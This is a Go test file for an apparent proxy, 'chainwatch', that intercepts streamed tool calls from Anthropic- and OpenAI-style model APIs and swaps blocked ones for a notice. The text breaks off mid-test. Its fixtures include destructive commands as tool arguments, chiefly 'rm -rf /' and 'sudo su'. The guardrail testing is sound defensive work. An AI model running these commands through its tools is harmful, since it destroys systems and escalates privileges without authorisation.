package intercept

import (
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"testing"
)

// --- Stream buffer unit tests ---

func TestStreamBufferBasic(t *testing.T) {
	sb := NewStreamBuffer(FormatAnthropic)

	sb.StartToolUse(0, "toolu_1", "run_command", "event:start")
	if !sb.IsBuffering(0) {
		t.Fatal("expected buffering at index 0")
	}
	if sb.IsBuffering(1) {
		t.Fatal("should not be buffering at index 1")
	}

	sb.AppendDelta(0, `{"command":"echo hello"}`, "event:delta")

	call, events, ok := sb.Complete(0, "event:stop")
	if !ok {
		t.Fatal("expected complete to succeed")
	}
	if call.ID != "toolu_1" {
		t.Errorf("expected id toolu_1, got %s", call.ID)
	}
	if call.Name != "run_command" {
		t.Errorf("expected name run_command, got %s", call.Name)
	}
	if call.Arguments["command"] != "echo hello" {
		t.Errorf("expected command=echo hello, got %v", call.Arguments)
	}
	if len(events) != 3 {
		t.Errorf("expected 3 events (start+delta+stop), got %d", len(events))
	}
	if call.ParseError != "" {
		t.Errorf("expected no parse error, got %s", call.ParseError)
	}

	// After complete, index should no longer be buffering
	if sb.IsBuffering(0) {
		t.Fatal("should not be buffering after complete")
	}
}

func TestStreamBufferFragmentedJSON(t *testing.T) {
	sb := NewStreamBuffer(FormatAnthropic)
	sb.StartToolUse(0, "toolu_1", "run_command", "event:start")

	// Simulate Anthropic's typical streaming: JSON sent in small fragments
	fragments := []string{
		`{"co`,
		`mmand`,
		`":"rm`,
		` -rf`,
		` /"}`,
	}
	for i, frag := range fragments {
		sb.AppendDelta(0, frag, fmt.Sprintf("event:delta_%d", i))
	}

	call, events, ok := sb.Complete(0, "event:stop")
	if !ok {
		t.Fatal("expected complete to succeed")
	}
	if call.ParseError != "" {
		t.Errorf("expected no parse error, got %s", call.ParseError)
	}
	if call.Arguments["command"] != "rm -rf /" {
		t.Errorf("expected command=rm -rf /, got %v", call.Arguments)
	}
	// start + 5 deltas + stop = 7 events
	if len(events) != 7 {
		t.Errorf("expected 7 events, got %d", len(events))
	}
}

func TestStreamBufferTruncation(t *testing.T) {
	sb := NewStreamBuffer(FormatAnthropic)
	sb.StartToolUse(0, "toolu_1", "run_command", "event:start")

	// Feed more than 1MB of data
	chunk := strings.Repeat("x", 1024)
	for i := 0; i < 1100; i++ {
		sb.AppendDelta(0, chunk, "event:delta")
	}

	call, _, ok := sb.Complete(0, "event:stop")
	if !ok {
		t.Fatal("expected complete to succeed")
	}
	if call.ParseError == "" {
		t.Fatal("expected parse error for truncated args")
	}
	if !strings.Contains(call.ParseError, "truncated") {
		t.Errorf("expected truncated error, got %s", call.ParseError)
	}
}

func TestStreamBufferMalformedJSON(t *testing.T) {
	sb := NewStreamBuffer(FormatAnthropic)
	sb.StartToolUse(0, "toolu_1", "run_command", "event:start")
	sb.AppendDelta(0, `{not valid json`, "event:delta")

	call, _, ok := sb.Complete(0, "event:stop")
	if !ok {
		t.Fatal("expected complete to succeed")
	}
	if call.ParseError == "" {
		t.Fatal("expected parse error for malformed JSON")
	}
	if !strings.Contains(call.ParseError, "malformed") {
		t.Errorf("expected malformed error, got %s", call.ParseError)
	}
}

func TestStreamBufferEmptyArgs(t *testing.T) {
	sb := NewStreamBuffer(FormatAnthropic)
	sb.StartToolUse(0, "toolu_1", "run_command", "event:start")

	// No AppendDelta calls — empty arguments

	call, _, ok := sb.Complete(0, "event:stop")
	if !ok {
		t.Fatal("expected complete to succeed")
	}
	if call.ParseError != "" {
		t.Errorf("expected no parse error for empty args, got %s", call.ParseError)
	}
	if call.Arguments != nil {
		t.Errorf("expected nil arguments, got %v", call.Arguments)
	}
}

func TestStreamBufferCompleteUnknownIndex(t *testing.T) {
	sb := NewStreamBuffer(FormatAnthropic)

	_, _, ok := sb.Complete(99, "event:stop")
	if ok {
		t.Fatal("expected complete to fail for unknown index")
	}
}

func TestStreamBufferMultipleToolCalls(t *testing.T) {
	sb := NewStreamBuffer(FormatAnthropic)

	// Start two tool calls at different indices
	sb.StartToolUse(0, "toolu_1", "run_command", "start:0")
	sb.StartToolUse(2, "toolu_2", "file_write", "start:2")

	sb.AppendDelta(0, `{"command":"ls"}`, "delta:0")
	sb.AppendDelta(2, `{"path":"/tmp/test"}`, "delta:2")

	call0, _, ok0 := sb.Complete(0, "stop:0")
	call2, _, ok2 := sb.Complete(2, "stop:2")

	if !ok0 || !ok2 {
		t.Fatal("expected both completes to succeed")
	}
	if call0.Name != "run_command" {
		t.Errorf("expected run_command, got %s", call0.Name)
	}
	if call2.Name != "file_write" {
		t.Errorf("expected file_write, got %s", call2.Name)
	}
	if call0.Arguments["command"] != "ls" {
		t.Errorf("expected command=ls, got %v", call0.Arguments)
	}
	if call2.Arguments["path"] != "/tmp/test" {
		t.Errorf("expected path=/tmp/test, got %v", call2.Arguments)
	}
}

// --- RewriteAnthropicSSE tests ---

func TestRewriteAnthropicSSEStructure(t *testing.T) {
	tc := ToolCall{
		ID:   "toolu_1",
		Name: "run_command",
		Arguments: map[string]any{
			"command": "rm -rf /",
		},
		Index: 0,
	}
	result := makeResult("deny", "denylist: destructive command", "denylist.block")

	events := RewriteAnthropicSSE(0, tc, result)
	if len(events) != 3 {
		t.Fatalf("expected 3 SSE events, got %d", len(events))
	}

	// Verify content_block_start
	startLine := events[0]
	if !strings.HasPrefix(startLine, "event: content_block_start\ndata: ") {
		t.Errorf("expected content_block_start event, got %s", startLine)
	}
	startJSON := strings.TrimPrefix(startLine, "event: content_block_start\ndata: ")
	startJSON = strings.TrimSuffix(startJSON, "\n")
	var startData map[string]any
	if err := json.Unmarshal([]byte(startJSON), &startData); err != nil {
		t.Fatalf("failed to parse start event: %v", err)
	}
	cb, _ := startData["content_block"].(map[string]any)
	if cb["type"] != "text" {
		t.Errorf("expected content_block type=text, got %v", cb["type"])
	}
	if startData["index"] != float64(0) {
		t.Errorf("expected index=0, got %v", startData["index"])
	}

	// Verify content_block_delta
	deltaLine := events[1]
	if !strings.HasPrefix(deltaLine, "event: content_block_delta\ndata: ") {
		t.Errorf("expected content_block_delta event, got %s", deltaLine)
	}
	deltaJSON := strings.TrimPrefix(deltaLine, "event: content_block_delta\ndata: ")
	deltaJSON = strings.TrimSuffix(deltaJSON, "\n")
	var deltaData map[string]any
	if err := json.Unmarshal([]byte(deltaJSON), &deltaData); err != nil {
		t.Fatalf("failed to parse delta event: %v", err)
	}
	delta, _ := deltaData["delta"].(map[string]any)
	if delta["type"] != "text_delta" {
		t.Errorf("expected delta type=text_delta, got %v", delta["type"])
	}
	text, _ := delta["text"].(string)
	if !strings.Contains(text, "[BLOCKED by chainwatch]") {
		t.Errorf("expected block message in delta text, got %s", text)
	}
	if !strings.Contains(text, "run_command") {
		t.Errorf("expected tool name in block message, got %s", text)
	}
	if !strings.Contains(text, "denylist.block") {
		t.Errorf("expected policy_id in block message, got %s", text)
	}

	// Verify content_block_stop
	stopLine := events[2]
	if !strings.HasPrefix(stopLine, "event: content_block_stop\ndata: ") {
		t.Errorf("expected content_block_stop event, got %s", stopLine)
	}
}

func TestRewriteAnthropicSSEPreservesIndex(t *testing.T) {
	tc := ToolCall{Name: "rm", Index: 3}
	result := makeResult("deny", "blocked", "test")

	events := RewriteAnthropicSSE(3, tc, result)

	// All three events should have index=3
	for i, event := range events {
		dataStart := strings.Index(event, "data: ")
		if dataStart == -1 {
			continue
		}
		dataJSON := strings.TrimSuffix(event[dataStart+6:], "\n")
		var data map[string]any
		if err := json.Unmarshal([]byte(dataJSON), &data); err != nil {
			t.Fatalf("event %d: failed to parse: %v", i, err)
		}
		if data["index"] != float64(3) {
			t.Errorf("event %d: expected index=3, got %v", i, data["index"])
		}
	}
}

// --- End-to-end streaming tests ---

// sseStream builds a mock SSE upstream that emits the given events.
func sseStream(events []string) *httptest.Server {
	return httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/event-stream")
		flusher := w.(http.Flusher)
		for _, ev := range events {
			fmt.Fprint(w, ev)
			flusher.Flush()
		}
	}))
}

func TestStreamingAllowedToolPassthrough(t *testing.T) {
	events := []string{
		"event: message_start\ndata: {\"type\":\"message_start\",\"message\":{\"id\":\"msg_1\"}}\n\n",
		"event: content_block_start\ndata: {\"type\":\"content_block_start\",\"index\":0,\"content_block\":{\"type\":\"tool_use\",\"id\":\"toolu_1\",\"name\":\"run_command\"}}\n\n",
		"event: content_block_delta\ndata: {\"type\":\"content_block_delta\",\"index\":0,\"delta\":{\"type\":\"input_json_delta\",\"partial_json\":\"{\\\"command\\\":\\\"echo hello\\\"}\" }}\n\n",
		"event: content_block_stop\ndata: {\"type\":\"content_block_stop\",\"index\":0}\n\n",
		"event: message_stop\ndata: {\"type\":\"message_stop\"}\n\n",
	}
	upstream := sseStream(events)
	defer upstream.Close()

	srv, port := newTestInterceptor(t, upstream.URL)
	cancel := startTestInterceptor(t, srv)
	defer cancel()

	client := interceptClient(port)
	resp, err := client.Post(interceptURL(port, "/v1/messages"), "application/json", strings.NewReader("{}"))
	if err != nil {
		t.Fatalf("request failed: %v", err)
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	output := string(body)

	// Allowed tool_use — original events should pass through
	if !strings.Contains(output, "toolu_1") {
		t.Errorf("expected tool_use id in output, got:\n%s", output)
	}
	if !strings.Contains(output, "run_command") {
		t.Errorf("expected tool name in output, got:\n%s", output)
	}
	if strings.Contains(output, "[BLOCKED") {
		t.Errorf("safe command should not be blocked, got:\n%s", output)
	}
}

func TestStreamingMixedTextAndToolCalls(t *testing.T) {
	events := []string{
		// message_start
		"event: message_start\ndata: {\"type\":\"message_start\",\"message\":{\"id\":\"msg_1\"}}\n\n",
		// text block at index 0
		"event: content_block_start\ndata: {\"type\":\"content_block_start\",\"index\":0,\"content_block\":{\"type\":\"text\",\"text\":\"\"}}\n\n",
		"event: content_block_delta\ndata: {\"type\":\"content_block_delta\",\"index\":0,\"delta\":{\"type\":\"text_delta\",\"text\":\"I will help you.\"}}\n\n",
		"event: content_block_stop\ndata: {\"type\":\"content_block_stop\",\"index\":0}\n\n",
		// safe tool at index 1
		"event: content_block_start\ndata: {\"type\":\"content_block_start\",\"index\":1,\"content_block\":{\"type\":\"tool_use\",\"id\":\"toolu_1\",\"name\":\"run_command\"}}\n\n",
		"event: content_block_delta\ndata: {\"type\":\"content_block_delta\",\"index\":1,\"delta\":{\"type\":\"input_json_delta\",\"partial_json\":\"{\\\"command\\\":\\\"echo safe\\\"}\"}}\n\n",
		"event: content_block_stop\ndata: {\"type\":\"content_block_stop\",\"index\":1}\n\n",
		// dangerous tool at index 2
		"event: content_block_start\ndata: {\"type\":\"content_block_start\",\"index\":2,\"content_block\":{\"type\":\"tool_use\",\"id\":\"toolu_2\",\"name\":\"run_command\"}}\n\n",
		"event: content_block_delta\ndata: {\"type\":\"content_block_delta\",\"index\":2,\"delta\":{\"type\":\"input_json_delta\",\"partial_json\":\"{\\\"command\\\":\\\"rm -rf /\\\"}\"}}\n\n",
		"event: content_block_stop\ndata: {\"type\":\"content_block_stop\",\"index\":2}\n\n",
		// message_stop
		"event: message_stop\ndata: {\"type\":\"message_stop\"}\n\n",
	}
	upstream := sseStream(events)
	defer upstream.Close()

	srv, port := newTestInterceptor(t, upstream.URL)
	cancel := startTestInterceptor(t, srv)
	defer cancel()

	client := interceptClient(port)
	resp, err := client.Post(interceptURL(port, "/v1/messages"), "application/json", strings.NewReader("{}"))
	if err != nil {
		t.Fatalf("request failed: %v", err)
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	output := string(body)

	// Text block should pass through
	if !strings.Contains(output, "I will help you.") {
		t.Errorf("expected text block to pass through, got:\n%s", output)
	}

	// Safe tool should pass through
	if !strings.Contains(output, "toolu_1") {
		t.Errorf("expected safe tool to pass through, got:\n%s", output)
	}

	// Dangerous tool should be blocked
	if !strings.Contains(output, "[BLOCKED by chainwatch]") {
		t.Errorf("expected block message for dangerous tool, got:\n%s", output)
	}
}

func TestStreamingMultipleBlockedTools(t *testing.T) {
	events := []string{
		"event: message_start\ndata: {\"type\":\"message_start\",\"message\":{\"id\":\"msg_1\"}}\n\n",
		// First blocked tool
		"event: content_block_start\ndata: {\"type\":\"content_block_start\",\"index\":0,\"content_block\":{\"type\":\"tool_use\",\"id\":\"toolu_1\",\"name\":\"run_command\"}}\n\n",
		"event: content_block_delta\ndata: {\"type\":\"content_block_delta\",\"index\":0,\"delta\":{\"type\":\"input_json_delta\",\"partial_json\":\"{\\\"command\\\":\\\"rm -rf /\\\"}\"}}\n\n",
		"event: content_block_stop\ndata: {\"type\":\"content_block_stop\",\"index\":0}\n\n",
		// Second blocked tool
		"event: content_block_start\ndata: {\"type\":\"content_block_start\",\"index\":1,\"content_block\":{\"type\":\"tool_use\",\"id\":\"toolu_2\",\"name\":\"run_command\"}}\n\n",
		"event: content_block_delta\ndata: {\"type\":\"content_block_delta\",\"index\":1,\"delta\":{\"type\":\"input_json_delta\",\"partial_json\":\"{\\\"command\\\":\\\"sudo su\\\"}\"}}\n\n",
		"event: content_block_stop\ndata: {\"type\":\"content_block_stop\",\"index\":1}\n\n",
		"event: message_stop\ndata: {\"type\":\"message_stop\"}\n\n",
	}
	upstream := sseStream(events)
	defer upstream.Close()

	srv, port := newTestInterceptor(t, upstream.URL)
	cancel := startTestInterceptor(t, srv)
	defer cancel()

	client := interceptClient(port)
	resp, err := client.Post(interceptURL(port, "/v1/messages"), "application/json", strings.NewReader("{}"))
	if err != nil {
		t.Fatalf("request failed: %v", err)
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	output := string(body)

	// Both should be blocked
	blockCount := strings.Count(output, "[BLOCKED by chainwatch]")
	if blockCount != 2 {
		t.Errorf("expected 2 block messages, got %d in:\n%s", blockCount, output)
	}
}

func TestStreamingFragmentedToolArgs(t *testing.T) {
	// Simulate realistic Anthropic streaming where JSON comes in tiny fragments
	events := []string{
		"event: message_start\ndata: {\"type\":\"message_start\",\"message\":{\"id\":\"msg_1\"}}\n\n",
		"event: content_block_start\ndata: {\"type\":\"content_block_start\",\"index\":0,\"content_block\":{\"type\":\"tool_use\",\"id\":\"toolu_1\",\"name\":\"run_command\"}}\n\n",
		// JSON fragments: {"command":"echo hello world"}
		"event: content_block_delta\ndata: {\"type\":\"content_block_delta\",\"index\":0,\"delta\":{\"type\":\"input_json_delta\",\"partial_json\":\"{\\\"co\"}}\n\n",
		"event: content_block_delta\ndata: {\"type\":\"content_block_delta\",\"index\":0,\"delta\":{\"type\":\"input_json_delta\",\"partial_json\":\"mmand\"}}\n\n",
		"event: content_block_delta\ndata: {\"type\":\"content_block_delta\",\"index\":0,\"delta\":{\"type\":\"input_json_delta\",\"partial_json\":\"\\\":\\\"\"}}\n\n",
		"event: content_block_delta\ndata: {\"type\":\"content_block_delta\",\"index\":0,\"delta\":{\"type\":\"input_json_delta\",\"partial_json\":\"echo \"}}\n\n",
		"event: content_block_delta\ndata: {\"type\":\"content_block_delta\",\"index\":0,\"delta\":{\"type\":\"input_json_delta\",\"partial_json\":\"hello \"}}\n\n",
		"event: content_block_delta\ndata: {\"type\":\"content_block_delta\",\"index\":0,\"delta\":{\"type\":\"input_json_delta\",\"partial_json\":\"world\\\"}\"}}\n\n",
		"event: content_block_stop\ndata: {\"type\":\"content_block_stop\",\"index\":0}\n\n",
		"event: message_stop\ndata: {\"type\":\"message_stop\"}\n\n",
	}
	upstream := sseStream(events)
	defer upstream.Close()

	srv, port := newTestInterceptor(t, upstream.URL)
	cancel := startTestInterceptor(t, srv)
	defer cancel()

	client := interceptClient(port)
	resp, err := client.Post(interceptURL(port, "/v1/messages"), "application/json", strings.NewReader("{}"))
	if err != nil {
		t.Fatalf("request failed: %v", err)
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	output := string(body)

	// Safe command — should pass through
	if strings.Contains(output, "[BLOCKED") {
		t.Errorf("safe fragmented command should not be blocked, got:\n%s", output)
	}
	// Original events should be emitted
	if !strings.Contains(output, "toolu_1") {
		t.Errorf("expected tool id in output, got:\n%s", output)
	}
}

func TestStreamingMessageEvents(t *testing.T) {
	// Verify message_start and message_stop pass through even during tool buffering
	events := []string{
		"event: message_start\ndata: {\"type\":\"message_start\",\"message\":{\"id\":\"msg_1\",\"model\":\"claude-3-opus\"}}\n\n",
		"event: content_block_start\ndata: {\"type\":\"content_block_start\",\"index\":0,\"content_block\":{\"type\":\"tool_use\",\"id\":\"toolu_1\",\"name\":\"run_command\"}}\n\n",
		"event: content_block_delta\ndata: {\"type\":\"content_block_delta\",\"index\":0,\"delta\":{\"type\":\"input_json_delta\",\"partial_json\":\"{\\\"command\\\":\\\"echo hi\\\"}\"}}\n\n",
		"event: content_block_stop\ndata: {\"type\":\"content_block_stop\",\"index\":0}\n\n",
		"event: message_delta\ndata: {\"type\":\"message_delta\",\"delta\":{\"stop_reason\":\"tool_use\"},\"usage\":{\"output_tokens\":42}}\n\n",
		"event: message_stop\ndata: {\"type\":\"message_stop\"}\n\n",
	}
	upstream := sseStream(events)
	defer upstream.Close()

	srv, port := newTestInterceptor(t, upstream.URL)
	cancel := startTestInterceptor(t, srv)
	defer cancel()

	client := interceptClient(port)
	resp, err := client.Post(interceptURL(port, "/v1/messages"), "application/json", strings.NewReader("{}"))
	if err != nil {
		t.Fatalf("request failed: %v", err)
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	output := string(body)

	// message_start should appear
	if !strings.Contains(output, "message_start") {
		t.Errorf("expected message_start to pass through, got:\n%s", output)
	}
	// message_delta should appear
	if !strings.Contains(output, "message_delta") {
		t.Errorf("expected message_delta to pass through, got:\n%s", output)
	}
	// message_stop should appear
	if !strings.Contains(output, "message_stop") {
		t.Errorf("expected message_stop to pass through, got:\n%s", output)
	}
}

func TestStreamingDoneSentinel(t *testing.T) {
	events := []string{
		"event: message_start\ndata: {\"type\":\"message_start\",\"message\":{\"id\":\"msg_1\"}}\n\n",
		"event: content_block_start\ndata: {\"type\":\"content_block_start\",\"index\":0,\"content_block\":{\"type\":\"text\",\"text\":\"\"}}\n\n",
		"event: content_block_delta\ndata: {\"type\":\"content_block_delta\",\"index\":0,\"delta\":{\"type\":\"text_delta\",\"text\":\"Hello\"}}\n\n",
		"event: content_block_stop\ndata: {\"type\":\"content_block_stop\",\"index\":0}\n\n",
		"event: message_stop\ndata: {\"type\":\"message_stop\"}\n\n",
		"data: [DONE]\n\n",
	}
	upstream := sseStream(events)
	defer upstream.Close()

	srv, port := newTestInterceptor(t, upstream.URL)
	cancel := startTestInterceptor(t, srv)
	defer cancel()

	client := interceptClient(port)
	resp, err := client.Post(interceptURL(port, "/v1/messages"), "application/json", strings.NewReader("{}"))
	if err != nil {
		t.Fatalf("request failed: %v", err)
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	output := string(body)

	if !strings.Contains(output, "[DONE]") {
		t.Errorf("expected [DONE] sentinel to pass through, got:\n%s", output)
	}
}

// --- OpenAI streaming tests ---

// openaiSSE builds an OpenAI-format SSE chunk line.
func openaiSSE(id string, delta map[string]any, finishReason *string) string {
	choice := map[string]any{
		"index":         0,
		"delta":         delta,
		"finish_reason": nil,
	}
	if finishReason != nil {
		choice["finish_reason"] = *finishReason
	}
	chunk := map[string]any{
		"id":      id,
		"object":  "chat.completion.chunk",
		"created": 1700000000,
		"choices": []any{choice},
	}
	data, _ := json.Marshal(chunk)
	return "data: " + string(data) + "\n\n"
}

func strPtr(s string) *string { return &s }

func TestOpenAIStreamingBlockedToolCall(t *testing.T) {
	events := []string{
		// Role assignment + tool call start
		openaiSSE("chatcmpl-1", map[string]any{
			"role":    "assistant",
			"content": nil,
			"tool_calls": []any{
				map[string]any{
					"index": 0,
					"id":    "call_abc",
					"type":  "function",
					"function": map[string]any{
						"name":      "run_command",
						"arguments": "",
					},
				},
			},
		}, nil),
		// Argument fragments
		openaiSSE("chatcmpl-1", map[string]any{
			"tool_calls": []any{
				map[string]any{
					"index": 0,
					"function": map[string]any{
						"arguments": `{"command`,
					},
				},
			},
		}, nil),
		openaiSSE("chatcmpl-1", map[string]any{
			"tool_calls": []any{
				map[string]any{
					"index": 0,
					"function": map[string]any{
						"arguments": `":"rm -rf /"}`,
					},
				},
			},
		}, nil),
		// Finish
		openaiSSE("chatcmpl-1", map[string]any{}, strPtr("tool_calls")),
		"data: [DONE]\n\n",
	}
	upstream := sseStream(events)
	defer upstream.Close()

	srv, port := newTestInterceptor(t, upstream.URL)
	cancel := startTestInterceptor(t, srv)
	defer cancel()

	client := interceptClient(port)
	resp, err := client.Post(interceptURL(port, "/v1/chat/completions"), "application/json", strings.NewReader("{}"))
	if err != nil {
		t.Fatalf("request failed: %v", err)
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	output := string(body)

	if !strings.Contains(output, "[BLOCKED by chainwatch]") {
		t.Errorf("expected block message for dangerous command, got:\n%s", output)
	}
	if !strings.Contains(output, "run_command") {
		t.Errorf("expected tool name in block message, got:\n%s", output)
	}
	// Should have stop finish_reason, not tool_calls
	if strings.Contains(output, `"finish_reason":"tool_calls"`) {
		t.Errorf("blocked tool calls should not have finish_reason=tool_calls, got:\n%s", output)
	}
	if !strings.Contains(output, "[DONE]") {
		t.Errorf("expected [DONE] sentinel, got:\n%s", output)
	}
}

func TestOpenAIStreamingAllowedToolCall(t *testing.T) {
	events := []string{
		openaiSSE("chatcmpl-1", map[string]any{
			"role":    "assistant",
			"content": nil,
			"tool_calls": []any{
				map[string]any{
					"index": 0,
					"id":    "call_abc",
					"type":  "function",
					"function": map[string]any{
						"name":      "run_command",
						"arguments": "",
					},
				},
			},
		}, nil),
		openaiSSE("chatcmpl-1", map[string]any{
			"tool_calls": []any{
				map[string]any{
					"index": 0,
					"function": map[string]any{
						"arguments": `{"command":"echo hello"}`,
					},
				},
			},
		}, nil),
		openaiSSE("chatcmpl-1", map[string]any{}, strPtr("tool_calls")),
		"data: [DONE]\n\n",
	}
	upstream := sseStream(events)
	defer upstream.Close()

	srv, port := newTestInterceptor(t, upstream.URL)
	cancel := startTestInterceptor(t, srv)
	defer cancel()

	client := interceptClient(port)
	resp, err := client.Post(interceptURL(port, "/v1/chat/completions"), "application/json", strings.NewReader("{}"))
	if err != nil {
		t.Fatalf("request failed: %v", err)
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	output := string(body)

	// Safe command — should pass through without blocking
	if strings.Contains(output, "[BLOCKED") {
		t.Errorf("safe command should not be blocked, got:\n%s", output)
	}
	if !strings.Contains(output, "call_abc") {
		t.Errorf("expected tool call ID in output, got:\n%s", output)
	}
	if !strings.Contains(output, "run_command") {
		t.Errorf("expected function name in output, got:\n%s", output)
	}
}

func TestOpenAIStreamingTextPassthrough(t *testing.T) {
	// Pure text streaming — no tool calls
	events := []string{
		openaiSSE("chatcmpl-1", map[string]any{
			"role":    "assistant",
			"content": "Hello ",
		}, nil),
		openaiSSE("chatcmpl-1", map[string]any{
			"content": "world!",
		}, nil),
		openaiSSE("chatcmpl-1", map[string]any{}, strPtr("stop")),
		"data: [DONE]\n\n",
	}
	upstream := sseStream(events)
	defer upstream.Close()

	srv, port := newTestInterceptor(t, upstream.URL)
	cancel := startTestInterceptor(t, srv)
	defer cancel()

	client := interceptClient(port)
	resp, err := client.Post(interceptURL(port, "/v1/chat/completions"), "application/json", strings.NewReader("{}"))
	if err != nil {
		t.Fatalf("request failed: %v", err)
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	output := string(body)

	if !strings.Contains(output, "Hello ") {
		t.Errorf("expected text content to pass through, got:\n%s", output)
	}
	if !strings.Contains(output, "world!") {
		t.Errorf("expected text content to pass through, got:\n%s", output)
	}
	if strings.Contains(output, "[BLOCKED") {
		t.Errorf("text-only stream should not be blocked, got:\n%s", output)
	}
}

func TestOpenAIStreamingParallelToolCalls(t *testing.T) {
	// Two parallel tool calls — one safe, one dangerous
	events := []string{
		// Both tool calls start in same chunk
		openaiSSE("chatcmpl-1", map[string]any{
			"role":    "assistant",
			"content": nil,
			"tool_calls": []any{
				map[string]any{
					"index": 0,
					"id":    "call_safe",
					"type":  "function",
					"function": map[string]any{
						"name":      "run_command",
						"arguments": "",
					},
				},
			},
		}, nil),
		openaiSSE("chatcmpl-1", map[string]any{
			"tool_calls": []any{
				map[string]any{
					"index": 0,
					"function": map[string]any{
						"arguments": `{"command":"echo safe"}`,
					},
				},
			},
		}, nil),
		// Second tool call
		openaiSSE("chatcmpl-1", map[string]any{
			"tool_calls": []any{
				map[string]any{
					"index": 1,
					"id":    "call_danger",
					"type":  "function",
					"function": map[string]any{
						"name":      "run_command",
						"arguments": "",
					},
				},
			},
		}, nil),
		openaiSSE("chatcmpl-1", map[string]any{
			"tool_calls": []any{
				map[string]any{
					"index": 1,
					"function": map[string]any{
						"arguments": `{"command":"rm -rf /"}`,
					},
				},
			},
		}, nil),
		// Finish
		openaiSSE("chatcmpl-1", map[string]any{}, strPtr("tool_calls")),
		"data: [DONE]\n\n",
	}
	upstream := sseStream(events)
	defer upstream.Close()

	srv, port := newTestInterceptor(t, upstream.URL)
	cancel := startTestInterceptor(t, srv)
	defer cancel()

	client := interceptClient(port)
	resp, err := client.Post(interceptURL(port, "/v1/chat/completions"), "application/json", strings.NewReader("{}"))
	if err != nil {
		t.Fatalf("request failed: %v", err)
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	output := string(body)

	// Should have exactly one block message (for the dangerous command)
	blockCount := strings.Count(output, "[BLOCKED by chainwatch]")
	if blockCount != 1 {
		t.Errorf("expected 1 block message, got %d in:\n%s", blockCount, output)
	}
	// Safe tool should pass through
	if !strings.Contains(output, "call_safe") {
		t.Errorf("expected safe tool to pass through, got:\n%s", output)
	}
}

func TestOpenAIStreamingXAICompleteToolCall(t *testing.T) {
	// xAI sends complete tool call in a single chunk (no fragmentation)
	events := []string{
		openaiSSE("chatcmpl-xai", map[string]any{
			"role":    "assistant",
			"content": nil,
			"tool_calls": []any{
				map[string]any{
					"index": 0,
					"id":    "call_xai",
					"type":  "function",
					"function": map[string]any{
						"name":      "run_command",
						"arguments": `{"command":"rm -rf /"}`,
					},
				},
			},
		}, nil),
		openaiSSE("chatcmpl-xai", map[string]any{}, strPtr("tool_calls")),
		"data: [DONE]\n\n",
	}
	upstream := sseStream(events)
	defer upstream.Close()

	srv, port := newTestInterceptor(t, upstream.URL)
	cancel := startTestInterceptor(t, srv)
	defer cancel()

	client := interceptClient(port)
	resp, err := client.Post(interceptURL(port, "/v1/chat/completions"), "application/json", strings.NewReader("{}"))
	if err != nil {
		t.Fatalf("request failed: %v", err)
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	output := string(body)

	// xAI complete-in-one-chunk should still be blocked
	if !strings.Contains(output, "[BLOCKED by chainwatch]") {
		t.Errorf("expected block message for xAI dangerous command, got:\n%s", output)
	}
}

func TestOpenAIStreamingDoneSentinel(t *testing.T) {
	events := []string{
		openaiSSE("chatcmpl-1", map[string]any{
			"role":    "assistant",
			"content": "Hi",
		}, nil),
		openaiSSE("chatcmpl-1", map[string]any{}, strPtr("stop")),
		"data: [DONE]\n\n",
	}
	upstream := sseStream(events)
	defer upstream.Close()

	srv, port := newTestInterceptor(t, upstream.URL)
	cancel := startTestInterceptor(t, srv)
	defer cancel()

	client := interceptClient(port)
	resp, err := client.Post(interceptURL(port, "/v1/chat/completions"), "application/json", strings.NewReader("{}"))
	if err != nil {
		t.Fatalf("request failed: %v", err)
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	output := string(body)

	if !strings.Contains(output, "[DONE]") {
		t.Errorf("expected [DONE] sentinel to pass through, got:\n%s", output)
	}
}

func TestOpenAIStreamingFragmentedArgs(t *testing.T) {
	// Arguments split across many small chunks (typical OpenAI behavior)
	events := []string{
		openaiSSE("chatcmpl-1", map[string]any{
			"role":    "assistant",
			"content": nil,
			"tool_calls": []any{
				map[string]any{
					"index": 0,
					"id":    "call_frag",
					"type":  "function",
					"function": map[string]any{
						"name":      "run_command",
						"arguments": "",
					},
				},
			},
		}, nil),
	}
	// Fragment: {"command":"echo hello world"}
	fragments := []string{`{"co`, `mman`, `d":"`, `echo`, ` hel`, `lo w`, `orld`, `"}`}
	for _, frag := range fragments {
		events = append(events, openaiSSE("chatcmpl-1", map[string]any{
			"tool_calls": []any{
				map[string]any{
					"index": 0,
					"function": map[string]any{
						"arguments": frag,
					},
				},
			},
		}, nil))
	}
	events = append(events,
		openaiSSE("chatcmpl-1", map[string]any{}, strPtr("tool_calls")),
		"data: [DONE]\n\n",
	)

	upstream := sseStream(events)
	defer upstream.Close()

	srv, port := newTestInterceptor(t, upstream.URL)
	cancel := startTestInterceptor(t, srv)
	defer cancel()

	client := interceptClient(port)
	resp, err := client.Post(interceptURL(port, "/v1/chat/completions"), "application/json", strings.NewReader("{}"))
	if err != nil {
		t.Fatalf("request failed: %v", err)
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	output := string(body)

	// Safe command reassembled from fragments — should not be blocked
	if strings.Contains(output, "[BLOCKED") {
		t.Errorf("safe fragmented command should not be blocked, got:\n%s", output)
	}
	if !strings.Contains(output, "call_frag") {
		t.Errorf("expected tool call id in output, got:\n%s", output)
	}
}

func TestOpenAIStreamingConcurrent(t *testing.T) {
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/event-stream")
		flusher := w.(http.Flusher)

		events := []string{
			openaiSSE("chatcmpl-c", map[string]any{
				"role":    "assistant",
				"content": nil,
				"tool_calls": []any{
